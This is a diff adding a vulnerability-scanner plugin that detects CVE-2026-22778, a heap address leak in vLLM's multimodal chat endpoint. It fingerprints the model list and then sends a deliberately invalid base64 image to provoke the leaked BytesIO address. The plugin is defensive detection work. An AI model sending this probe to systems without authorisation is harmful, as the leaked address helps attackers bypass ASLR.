@@ -1,0 +1,91 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "VLLM_CVE_2026_22778"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-22778"
+  }
+  severity: CRITICAL
+  title: "Heap Memory Address Leak in vLLM Multimodal Endpoint (CVE-2026-22778)"
+  description: "vLLM versions from 0.8.3 to before 0.14.1 contain an information disclosure vulnerability in the multimodal chat completion API. When an invalid image payload is submitted to the OpenAI-compatible endpoint, Pillow raises an exception containing the virtual memory heap address of the BytesIO buffer. vLLM returns this error message directly to the client without sanitization, leaking internal heap addresses and defeating Address Space Layout Randomization (ASLR)."
+  recommendation: "Upgrade vLLM to version 0.14.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-22778"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_vllm_models"
+  http_request: {
+    method: GET
+    uri: "/v1/models"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"object\":" },
+          { body: {} contains: "\"id\":" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\"id\":\\s*\"([^\"]+)\""
+            variable_name: "MODEL_ID"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_heap_address_leak"
+  http_request: {
+    method: POST
+    uri: "/v1/chat/completions"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"model\":\"{{ MODEL_ID }}\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"describe\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"data:image/png;base64,bm90YW5pbWFnZQ==\"}}]}],\"max_tokens\":1}"
+    response: {
+      http_status: 400
+      expect_all: {
+        conditions: [
+          { body: {} contains: "_io.BytesIO object at 0x" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_vllm_models",
+    "check_heap_address_leak"
+  ]
+}
